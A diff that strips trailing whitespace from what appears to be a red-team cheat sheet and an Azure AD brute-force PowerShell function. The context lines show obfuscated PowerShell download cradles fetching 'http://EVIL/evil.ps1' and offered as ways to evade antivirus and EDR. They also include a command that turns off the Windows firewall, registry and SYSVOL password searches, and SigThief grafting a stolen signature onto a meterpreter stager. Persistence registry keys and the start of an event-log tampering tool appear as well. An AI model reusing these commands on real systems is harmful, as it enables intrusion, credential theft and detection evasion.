@@ -119,12 +119,12 @@ function Invoke-BruteForceDoS
 
             $stream.Position = 0
             $stream.Read($responseBytes,0,$stream.Length) | Out-Null
-            
+
             $errorDetails = [text.encoding]::UTF8.GetString($responseBytes) | ConvertFrom-Json | Select -ExpandProperty error_description
 
             $datacenter = "{0,-6}" -f ($_.Exception.Response.Headers["x-ms-ests-server"].Split(" ")[2])
         }
-            
+
         # Parse the error code.
         if(!$exists -and $errorDetails)
         {
@@ -138,7 +138,7 @@ function Invoke-BruteForceDoS
             }
             elseif($errorDetails.StartsWith("AADSTS50034")) # The user account {identifier} does not exist in the {tenant} directory. To sign into this application, the account must be added to the directory.
             {
-                Write-Host "$($datacenter): [NOTFOUND] $user" 
+                Write-Host "$($datacenter): [NOTFOUND] $user"
             }
         }
     }
@@ -240,7 +240,7 @@ PS> powershell.exe -command "netsh advfirewall set allprofiles state off"
 ## Enumerating Domain Controllers with PowerShell
 
 ```
-[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers 
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
 ```
 
 ## Enumerating Domain Users with PowerShell
@@ -412,7 +412,7 @@ findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
 ## Searching the Registry for Passwords
 
 ```
-reg query HKLM /f password  /t REG_SZ  /s 
+reg query HKLM /f password  /t REG_SZ  /s
 ```
 
 ## Local Domain Recon
@@ -426,13 +426,13 @@ echo %USERDOMAIN%
 Maps AD trust relationships:
 
 ```
-nltest /domain_trusts 
+nltest /domain_trusts
 ```
 
 Prints the domain controller name:
 
 ```
-echo %logonserver% 
+echo %logonserver%
 ```
 
 ## Searching the File System for Files of Interest
@@ -554,7 +554,7 @@ is.popen("c:\windows\system32\cmd.exe /c 'c:\windows\syswow64\msdt.exe -path C:\
 ## TCPDump
 
 ```
-tcpdump -i <interface> # Capture, can use "any" 
+tcpdump -i <interface> # Capture, can use "any"
 tcpdump -i <interface> -w <file> # Write to a file after capture
 tcpdump -r <file> -n # Read from a file and don't resolve hosts and ports
 tcpdump -r <file> -n -A # Read from a file and don't resolve hosts and ports, show as ASCII
@@ -602,9 +602,9 @@ ntdsutil: quit
 This are different types of download cradles which should be an inspiration to play and create new download cradles to bypass AV/EPP/EDR in context of download cradle detections. Notice, removing or obfuscating signatures from your download cradle is only one piece of the puzzle to bypass an AV/EPP/EDR. Depending on the respective product you have to modify your payload which should be downloaded by the cradle to bypass API-Hooking, Callbacks, AMSI etc.
 
 ```
-# not proxy aware cmd download cradles 
+# not proxy aware cmd download cradles
 
-# default download cradle 
+# default download cradle
 c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/evil.ps1\")"
 PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/evil.ps1\")"
 
@@ -658,7 +658,7 @@ Processing...
         40-EC-99-B9-17-25 > F0-B4-D2-5A-D3-E2, ethertype IPv4 (0x0800), length 66: 192.168.0.62.65066 > 172.217.2.115.443: Flags [S], seq 1995496356, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
 23:02:26.599504500 PktGroupId 1688849860264106, PktNumber 1, Appearance 1, Direction Rx , Type Ethernet , Component 33, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
         F0-B4-D2-5A-D3-E2 > 40-EC-99-B9-17-25, ethertype IPv4 (0x0800), length 66: 172.217.2.115.443 > 192.168.0.62.65066: Flags [S.], seq 546326696, ack 1995496357, win 60720, options [mss 1380,nop,nop,sackOK,nop,wscale 8], length 0
-23:02:26.599510100 PktGroupId 1688849860264106, PktNumber 1, Appearance 2, Direction Rx , Type Ethernet , Component 32, 
+23:02:26.599510100 PktGroupId 1688849860264106, PktNumber 1, Appearance 2, Direction Rx , Type Ethernet , Component 32,
 ... <TRUNCATED FOR BREVITY>....
 ```
 
@@ -824,10 +824,10 @@ Download: <https://github.com/secretsquirrel/SigThief>
 Rips a signature off a signed PE file and appends it to another one, fixing up the certificate table to sign the file.
 
 ```
-$ ./sigthief.py -i procmon.exe -t x86_meterpreter_stager.exe -o /tmp/definitely_legit.exe 
+$ ./sigthief.py -i procmon.exe -t x86_meterpreter_stager.exe -o /tmp/definitely_legit.exe
 
-Output file: /tmp/definitely_legit.exe 
-Signature appended. 
+Output file: /tmp/definitely_legit.exe
+Signature appended.
 FIN.
 ```
 
@@ -844,7 +844,7 @@ certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSpl
 SMB ( Server Message Block ) authentication without credentials, also known as anonymous SMB access, allows users to access shared resources on a network without providing username or passwords. This can be useful for accessing shared folders that have been configured to allow anonymous access.
 
 ```
-"Authentication: disabled" port:445 product:"Samba" 
+"Authentication: disabled" port:445 product:"Samba"
 ```
 
 ```
@@ -1124,9 +1124,9 @@ HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
 software\microsoft\windows\currentversion\run\microsoft windows html help
 %AppData%\Microsoft\Windows\Start Menu\Programs\Startup
 HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD
-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
-HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices 
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
 ```
 
@@ -1179,7 +1179,7 @@ This script demonstrates how to interact with Microsoft Azure Active Directory v
 # Import the Azure AD PowerShell module:
 Import-Module -Name Azure
 # List the cmdlets provided by the module (750+):
-Get-Command -Module Azure 
+Get-Command -Module Azure
 Add-AzureAccount
 Get-AzureAccount
 Get-AzureSubscription
@@ -1271,7 +1271,7 @@ using System.Runtime.InteropServices;
 namespace EventLogsForRedTeams
 {
     class Program
-    { 
+    {
 
     [DllImport("kernel32.dll")]
     public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect,
